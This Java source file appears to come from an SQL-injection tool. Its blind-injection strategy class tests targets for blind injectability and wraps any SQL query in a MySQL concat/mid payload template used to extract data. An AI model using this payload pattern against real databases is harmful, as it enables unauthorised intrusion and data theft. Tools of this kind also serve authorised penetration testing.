package com.jsql.model.pattern.strategy;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.InjectionModel;
import com.jsql.model.Suspendable;
import com.jsql.model.bean.Request;
import com.jsql.model.blind.ConcreteBlindInjection;
import com.jsql.view.GUIMediator;

public class BlindStrategy implements IInjectionStrategy {
    
    private ConcreteBlindInjection blind;
    
    private boolean isApplicable = false;
    
    @Override
    public void checkApplicability() throws PreparationException {
        InjectionModel.LOGGER.info("Blind test...");
        
        blind = new ConcreteBlindInjection();
        
        isApplicable = blind.isInjectable();
        
        if (isApplicable) {
            activate();
        } else {
            deactivate();
        }
    }

    @Override
    public boolean isApplicable() {
        return isApplicable;
    }

    @Override
    public void activate() {
        Request request = new Request();
        request.setMessage("MarkBlindVulnerable");
        GUIMediator.model().interact(request);
    }

    @Override
    public void deactivate() {
        Request request = new Request();
        request.setMessage("MarkBlindInvulnerable");
        GUIMediator.model().interact(request);
    }

    @Override
    public String inject(String sqlQuery, String startPosition, Suspendable stoppable) throws StoppableException {
        return blind.inject("(" +
                "select+" +
                    "concat(" +
                        "0x53514c69," +
                        "mid(" +
                            "(" + sqlQuery + ")," +
                            startPosition + "," +
                            "65536" +
                        ")" +
                    ")" +
                ")", stoppable);
    }

    @Override
    public void applyStrategy() {
        InjectionModel.LOGGER.info("Using blind injection...");
        GUIMediator.model().applyStrategy(this);
        
        Request request = new Request();
        request.setMessage("MessageBinary");
        request.setParameters(blind.getInfoMessage());
        GUIMediator.model().interact(request);
        
        Request request2 = new Request();
        request2.setMessage("MarkBlindStrategy");
        GUIMediator.model().interact(request2);
    }
}
